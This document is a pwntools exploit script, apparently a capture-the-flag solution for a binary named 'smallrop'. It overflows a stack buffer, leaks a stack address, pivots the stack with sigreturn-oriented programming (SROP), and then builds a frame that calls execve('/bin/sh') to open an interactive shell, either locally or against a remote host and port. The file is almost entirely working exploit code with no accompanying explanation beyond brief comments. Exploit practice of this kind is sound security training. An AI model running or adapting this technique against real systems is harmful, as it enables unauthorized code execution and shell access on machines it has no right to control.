#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('./challenge/smallrop')
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    # PTY is multidirectional, pipes (which are used by default) are NOT!
    conn = lambda: e.process(stdin=PTY)

vuln = lambda data: p.sendafter(b"> ", data)
syscall_into_vuln = 0x40100a
syscall_ret = 0x40103a

p = conn()

payload  = b"A"*0x80
payload += p64(e.sym.vuln)
payload += p64(syscall_into_vuln)
vuln(payload)

# set eax=1 (SYS_write) for a write syscall
vuln(b"X")

p.recvn(len(payload)-8)
stack = p.u64()
log.info("stack leak: %#x", stack)

# since stack moves around, we'll can't reliably offset from this leaked address
# so we'll select some fixed (unused) section and pivot to it using SROP
new_rsp = (stack-0x1000) & ~0xfff

frame = SigreturnFrame()
frame.rsp = new_rsp
frame.rip = e.sym.vuln

payload  = b"A"*0x80
payload += p64(e.sym.vuln)
payload += p64(syscall_ret)
payload += bytes(frame)
vuln(payload)

# eax=0xf (SYS_rt_sigreturn)
vuln(b"X"*0xf)


# now that we've pivoted, we know for certainty where our data is
# 1. place "/bin/sh" into memory
# 2. perform same setup to trigger SROP to call execve("/bin/sh", NULL, NULL)
binsh = new_rsp - 0x80

frame = SigreturnFrame()
frame.rdi = binsh
frame.rsi = frame.rdx = 0
frame.rax = constants.SYS_execve
frame.rip = syscall_ret

payload  = b"/bin/sh\x00"
payload  = payload.ljust(0x80, b"A")
payload += p64(e.sym.vuln)
payload += p64(syscall_ret)
payload += bytes(frame)
vuln(payload)

vuln(b"X"*0xf)
p.interactive()
